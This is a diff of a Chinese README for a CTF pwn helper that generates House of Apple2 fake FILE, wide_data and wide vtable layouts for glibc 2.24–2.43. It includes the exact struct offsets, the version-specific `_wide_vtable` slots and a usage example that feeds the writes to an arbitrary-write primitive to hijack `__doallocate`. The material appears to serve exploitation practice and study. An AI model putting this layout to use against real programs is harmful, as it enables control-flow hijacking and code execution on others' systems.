@@ -42,51 +42,119 @@
 
 ## Python 离线板子
 
-[`apple2.py`](./apple2.py) 按目标 glibc 版本生成 Apple2 **最终消费点**所需的写入计划。它严格对应三份 C PoC：
+[`apple2.py`](./apple2.py) 提供 `build_house_of_apple2`，生成 Apple2 最终消费点的对象布局。
+
+### 函数用途
+
+构造以下调用链所需的对象：
+
+```text
+__woverflow(fp, L'A')
+  -> primary vtable 的 _IO_wfile_overflow
+  -> _IO_wdoallocbuf(fp)
+  -> fake wide_data->_wide_vtable->__doallocate(fp)
+  -> callback
+```
+
+### 最小使用示例
 
 ```python
 from apple2 import build_house_of_apple2
 
+# 占位地址：题目中换成 libc_base + 偏移 / 已泄露地址
 writes = build_house_of_apple2(
-    "2.35",                         # 2.31～2.43 使用 wide_data + 0xe0
-    file_addr=fake_file,
-    fake_wide_data_addr=fake_wide_data,
-    fake_wide_vtable_addr=fake_wide_vtable,
-    callback_addr=callback,
-    wfile_jumps_addr=libc_base + io_wfile_jumps_offset,
-    narrow_buffer_addr=controlled_buffer,
-    current_flags=known_file_flags,  # 不知道时省略，保留原 flags
+    "2.35",
+    file_addr=0x100000,          # fake FILE 地址
+    fake_wide_data_addr=0x200000,  # fake wide_data 地址
+    fake_wide_vtable_addr=0x201000,  # fake wide vtable 地址
+    callback_addr=0x401234,      # doallocate 回调
+    wfile_jumps_addr=0x7fff0000, # 合法 _IO_wfile_jumps
+    narrow_buffer_addr=0x300000, # 窄字符缓冲区
 )
 
-for write in writes:
-    write_primitive(write.address, write.data)
+# 返回 MemoryWrite 元组；每个元素是 (address, data, label)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+
+# 交给题目的任意写：write_primitive(w.address, w.data)
 ```
 
-### `build_house_of_apple2` 参数
+### 对应 PoC
+
+- [`poc_sink_2.24_2.29.c`](./poc_sink_2.24_2.29.c)；
+- [`poc_sink_2.30.c`](./poc_sink_2.30.c)；
+- [`poc_sink_2.31_2.43.c`](./poc_sink_2.31_2.43.c)。
+
+### 版本与 ABI 偏移
+
+| glibc | `_wide_data->_wide_vtable` 偏移 |
+|---|---|
+| 2.24～2.29 | `+0x130` |
+| 2.30 | `+0xf0` |
+| 2.31～2.43 | `+0xe0` |
+
+`_IO_jump_t.__doallocate` 固定位于 vtable `+0x68`。
+
+### 参数
 
 | 参数 | 含义 |
 |---|---|
-| `version` | 目标 glibc 版本字符串。支持 `2.24`～`2.43`；根据此选择 `_wide_vtable` 的 `0x130`、`0xf0` 或 `0xe0` 偏移。 |
-| `file_addr` | fake FILE 或被覆盖的现有 FILE 地址；函数会在这个地址生成 `FILE` 字段写入。 |
-| `fake_wide_data_addr` | fake `_IO_wide_data` 地址；`FILE + 0xa0` 会指向这里。该地址必须可写并满足题目布局要求。 |
-| `fake_wide_vtable_addr` | fake wide vtable 地址；fake wide data 的版本对应槽位会指向这里。 |
-| `callback_addr` | fake wide vtable 的 `__doallocate` 回调地址，固定写在 vtable `+0x68`；实际回调用途由题目决定。 |
-| `wfile_jumps_addr` | 目标 libc 中合法 `_IO_wfile_jumps` 地址，写入 `FILE + 0xd8` 以通过 primary vtable 检查。 |
-| `narrow_buffer_addr` | fake FILE 使用的窄字符缓冲区地址；对应 PoC 中的 `narrow_buffer`，函数按固定 `0x20` 字节生成结束地址。 |
-| `current_flags` | 当前 `_flags` 值；已知时传入，函数清除 `NO_WRITES`、`UNBUFFERED`、`CURRENTLY_PUTTING`，未知时省略以保留原字段。 |
+| `version` | 目标 glibc 版本，支持 `2.24`～`2.43`。 |
+| `file_addr` | fake FILE 或被覆盖 FILE 地址。 |
+| `fake_wide_data_addr` | fake `_IO_wide_data` 地址，写入 `FILE+0xa0`。 |
+| `fake_wide_vtable_addr` | fake wide vtable 地址，写入 fake wide_data 的版本对应槽位。 |
+| `callback_addr` | `__doallocate` 回调地址，写入 fake wide vtable `+0x68`。 |
+| `wfile_jumps_addr` | 目标 libc 合法 `_IO_wfile_jumps` 地址，写入 `FILE+0xd8`。 |
+| `narrow_buffer_addr` | fake FILE 的窄字符缓冲区地址；函数按 `+0x20` 生成结束地址。 |
+| `current_flags` | 当前 `_flags` 值；传入后清除 `NO_WRITES | UNBUFFERED | CURRENTLY_PUTTING`，未知时省略。 |
 
-返回值是 `MemoryWrite` 元组。每项包含 `address`、`data` 和 `label`，可直接交给题目的任意写、堆对象编辑或分段写入函数。函数不负责 fake FILE 的投递、libc 地址解析、`__woverflow` 触发或 callback 后续控制流。
+### 返回对象
 
-版本对应关系：
+返回 `MemoryWrite` 元组。`MemoryWrite` 每个成员含义：
+
+| 成员 | 含义 |
+|---|---|
+| `address` | 要写入的绝对地址。 |
+| `data` | 要写入的小端字节串（`bytes`）。 |
+| `label` | 该写入的用途标签，用于调试和识别。 |
+
+各写入内容：
 
 ```text
-2.24～2.29: fake_wide_data + 0x130 -> fake_wide_vtable
-2.30:       fake_wide_data + 0x0f0 -> fake_wide_vtable
-2.31～2.43: fake_wide_data + 0x0e0 -> fake_wide_vtable
-所有版本:   fake_wide_vtable + 0x068 -> callback
+FILE 字段写入（file_addr 处）：
+    +0x00  _flags（可选，4 字节）
+    +0xa0  _wide_data = fake_wide_data_addr
+    +0xd8  vtable = wfile_jumps_addr
+    +0xc0  _mode = 1
+    +0x08/+0x10/+0x18  _IO_read_base/_ptr/_end = narrow_buffer_addr
+    +0x20/+0x28/+0x30  _IO_write_base/_ptr/_end = narrow_buffer_addr（end 为 +0x20）
+    +0x38/+0x40  _IO_buf_base/_end = narrow_buffer_addr（end 为 +0x20）
+
+fake wide_data（fake_wide_data_addr 处）：
+    零填充到 _wide_vtable 槽，槽值 = fake_wide_vtable_addr
+
+fake wide_vtable（fake_wide_vtable_addr 处）：
+    零填充到 +0x68，槽值 = callback_addr
 ```
 
-返回的 `MemoryWrite` 包含绝对地址、零填充对象镜像和标签。函数只负责消费点布局；`wfile_jumps_addr`、fake FILE 的投递、`__woverflow`/等价 wide overflow 触发和 callback 的实际语义由题目 exploit 提供。它不假设 largebin、stderr 覆盖或任何 hook 终点。
+使用时对每个 `w in writes` 执行 `write_primitive(w.address, w.data)` 即可。
+
+### 调用者必须提供
+
+```text
+libc 基址和 _IO_wfile_jumps 地址
+能投递 fake FILE / 覆盖现有 FILE 的原语
+能触发 __woverflow 或等价 wide overflow 的入口
+```
+
+### 函数不负责
+
+```text
+不把 fake FILE 挂到 _IO_list_all
+不负责 largebin 等投递原语
+不触发 __woverflow
+不处理 callback 的实际 RCE/ORW 逻辑
+```
 
 ## 迁移与调试
 
